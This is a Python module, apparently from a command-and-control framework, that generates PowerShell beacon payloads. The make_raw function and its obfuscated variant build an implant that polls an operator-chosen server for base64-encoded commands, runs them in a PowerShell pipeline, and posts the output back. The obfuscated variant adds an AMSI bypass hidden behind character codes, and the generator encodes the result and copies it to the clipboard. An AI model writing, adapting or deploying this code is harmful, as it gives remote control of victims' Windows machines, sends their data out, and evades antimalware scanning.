import base64
import random
from typing import Union
import textwrap
from core.payload_generator.common import payload_utils as payutils
from core.payload_generator.common.web_utils import build_ps_http_context
from core.malleable_c2.malleable_c2 import MalleableProfile
from colorama import init, Fore, Style

brightgreen = "\001" + Style.BRIGHT + Fore.GREEN + "\002"
brightyellow = "\001" + Style.BRIGHT + Fore.YELLOW + "\002"
brightred = "\001" + Style.BRIGHT + Fore.RED + "\002"
brightblue = "\001" + Style.BRIGHT + Fore.BLUE + "\002"

def make_raw(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter, profile: Union[str, MalleableProfile, None] = None):

	ctx = build_ps_http_context(
    	ip, port,
    	transport="http",
    	headers=headers,
    	useragent=useragent,
    	accept=accept,
    	byte_range=byte_range,
    	interval=beacon_interval,
    	jitter=jitter,
    	profile=profile,
	)

	raw = (
		f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
		f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
		f"$sid=G-SID;$uri='{ctx.beacon_url}';$uri2='{ctx.beacon_post_url}';"
		"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
		"$hdr=@{'X-Session-ID'=$sid};"

		# Define Get-Task
		"Function Get-Task {"
		"$req = [System.Net.HttpWebRequest]::Create($uri);"
		"$req.Method = 'GET';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		f"{ctx.formatted_headers}"
		f"$req.UserAgent = '{ctx.effective_ua}';"
		f"{ctx.accept_header}"
		f"{ctx.host_header}"
		f"{ctx.range_header}"
		"$resp = $req.GetResponse();"
		"$stream = $resp.GetResponseStream();"
		"$reader = New-Object System.IO.StreamReader($stream);"
		"$result = $reader.ReadToEnd();"
		"$reader.Close();$stream.Close();$resp.Close();"
		"return $result"
		"};"

		# Define Send-Output
		"Function Send-Output($payload) {"
		"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
		"$req = [System.Net.HttpWebRequest]::Create($uri2);"
		"$req.Method = 'POST';"
		"$req.ContentType = 'application/json';"
		"$req.Headers.Add('X-Session-ID',$sid);"
		f"{ctx.formatted_headers}"
		f"$req.UserAgent = '{ctx.effective_ua}';"
		f"{ctx.accept_header}"
		f"{ctx.host_header}"
		f"{ctx.range_header}"
		"$req.ContentLength = $bytes.Length;"
		"$stream = $req.GetRequestStream();"
		"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
		"$resp = $req.GetResponse();$resp.Close()"
		"};"

		# Init PS pipeline
		"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
		"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
		"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

		# Beacon loop
		"while($true){"
		"try{"
		"$taskJson = Get-Task;"
		"$task = ConvertFrom-Json $taskJson;"
		f"{ctx.grab_output}"
		"$cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd_b64));"
		"$pipeline.Commands.Clear();"
		"$pipeline.AddScript($cmd)|Out-Null;"
		"$results = $pipeline.Invoke();"
		"$output = $results|Out-String;"
		"$b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
		f"{ctx.send_output}"
		"Send-Output $body;"
		"}"
		"}catch{};"
		f"$jitter = {ctx.beacon_jitter};"
		f"$jitmax = $jitter + 30;"
		f"if ($jitter -eq 0) {{ $delay = {ctx.beacon_interval} }} else {{ "
		f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
		f"$j = [Math]::Floor(({ctx.beacon_interval} * $percent) / 100);"
		f"$delay = {ctx.beacon_interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
		"Start-Sleep -Seconds $delay;"
		"}"
	)

	return raw



def generate_windows_powershell_http(ip, port, obs, beacon_interval, headers, useragent, accept, byte_range, jitter=0, no_child=None, profile=None):

	if obs is None or obs == 0:
		print(brightgreen + f"[*] Generating HTTP payload...")
		payload = make_raw(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	if obs == 1:
		payload = generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd

	elif obs == 2:
		print(brightgreen + useragent)
		payload = generate_windows_powershell_http_obfuscate_level2(ip, port, beacon_interval, headers, useragent, accept=accept, byte_range=byte_range, jitter=jitter, profile=profile)
		cmd = payutils.encode_win_payload(payload, no_child)
		payutils.copy_and_print(cmd)
		return cmd
		
	"""else:
		return _obfuscate_level3(template)"""

def generate_windows_powershell_http_obfuscate_level1(ip, port, beacon_interval, headers, useragent, accept, byte_range, jitter, profile):
	ctx = build_ps_http_context(
    	ip, port,
    	transport="http",
    	headers=headers,
    	useragent=useragent,
    	accept=accept,
    	byte_range=byte_range,
    	interval=beacon_interval,
    	jitter=jitter,
    	profile=profile,
	)

	one_liner = (
	f"Function G-SID{{$c='abcdefghijklmnopqrstuvwxyz0123456789'.ToCharArray();"
	f"$p=@();1..3|%{{$p+=-join(1..5|%{{$c|Get-Random}})}};$p -join'-'}};"
	f"$sid=G-SID;$uri='{ctx.beacon_url}';$uri2='{ctx.beacon_post_url}';"
	f"[System.Net.WebRequest]::DefaultWebProxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy();"
	f"$hdr=@{{'X-Session-ID'=$sid}};"

	# AMSI bypass
	"$e=[Ref].('Assem'+'bly').GetType(([string]::Join('',[char[]]"
	"(83,121,115,116,101,109,46,77,97,110,97,103,101,109,101,110,116,46,65,117,116,111,109,97,116,105,111,110,46,65,109,115,105,85,116,105,108,115))));"
	"$n='Non'+'Public';$s='Static';"
	"$f=$e.GetField(([string]::Join('',[char[]]"
	"(97,109,115,105,73,110,105,116,70,97,105,108,101,100))),$n+','+$s);"
	"$t=[type[]]@([object],[bool]);"
	"$m=$f.GetType().GetMethod('Set'+'Value',$t);"
	"$m.Invoke($f,@($null,$true));"

	# Define GET using .NET
	"Function Get-Task {"
	"$req = [System.Net.HttpWebRequest]::Create($uri);"
	"$req.Method = 'GET';"
	f"{ctx.host_header}"
	"$req.Headers.Add('X-Session-ID',$sid);"
	f"{ctx.formatted_headers}"
	f"$req.UserAgent = '{ctx.effective_ua}';"
	f"{ctx.accept_header}"
	f"{ctx.range_header}"
	"$resp = $req.GetResponse();"
	"$stream = $resp.GetResponseStream();"
	"$reader = New-Object System.IO.StreamReader($stream);"
	"$result = $reader.ReadToEnd();"
	"$reader.Close();$stream.Close();$resp.Close();"
	"return $result"
	"};"

	# Define POST using .NET
	"Function Send-Output($payload) {"
	"$bytes = [System.Text.Encoding]::UTF8.GetBytes($payload);"
	"$req = [System.Net.HttpWebRequest]::Create($uri2);"
	"$req.Method = 'POST';"
	f"{ctx.host_header}"
	"$req.ContentType = 'application/json';"
	"$req.Headers.Add('X-Session-ID',$sid);"
	f"{ctx.formatted_headers}"
	f"$req.UserAgent = '{ctx.effective_ua}';"
	f"{ctx.accept_header}"
	f"{ctx.range_header}"
	"$req.ContentLength = $bytes.Length;"
	"$stream = $req.GetRequestStream();"
	"$stream.Write($bytes,0,$bytes.Length);$stream.Close();"
	"$resp = $req.GetResponse();$resp.Close()"
	"};"

	# PowerShell pipeline init
	"$PSA = [AppDomain]::CurrentDomain.GetAssemblies()|?{$_ -like '*Automation*'};"
	"$PSClass = $PSA.GetType('System.Management.Automation.PowerShell');"
	"$pipeline = ($PSClass.GetMethods()|?{$_.Name -eq 'Create' -and $_.GetParameters().Count -eq 0}).Invoke($null,$null);"

	# Beacon loop
	f"while($true){{"
	"try{"
	"    $taskJson = Get-Task;"
	"    $task = ConvertFrom-Json $taskJson;"
	f"   {ctx.grab_output}"
	"        $cmd = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($cmd_b64));"
	"        $pipeline.Commands.Clear();"
	"        $pipeline.AddScript($cmd)|Out-Null;"
	"        $results = $pipeline.Invoke();"
	"        $output = $results|Out-String;"
	"        $b64 = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($output.Trim()));"
	f"       {ctx.send_output}"
	"        Send-Output $body;"
	"    };"
	"}"
	"catch{};"
	f"$jitter = {ctx.beacon_jitter};"
	f"$jitmax = $jitter + 30;"
	f"if ($jitter -eq 0) {{ $delay = {ctx.beacon_interval} }} else {{ "
	f"$percent = Get-Random -Minimum -$jitter -Maximum $jitmax;"
	f"$j = [Math]::Floor(({ctx.beacon_interval} * $percent) / 100);"
	f"$delay = {ctx.beacon_interval} + $j; if ($delay -lt 1) {{ $delay = 1 }} }}"
	"Start-Sleep -Seconds $delay;"
	"}"
)

	return one_liner

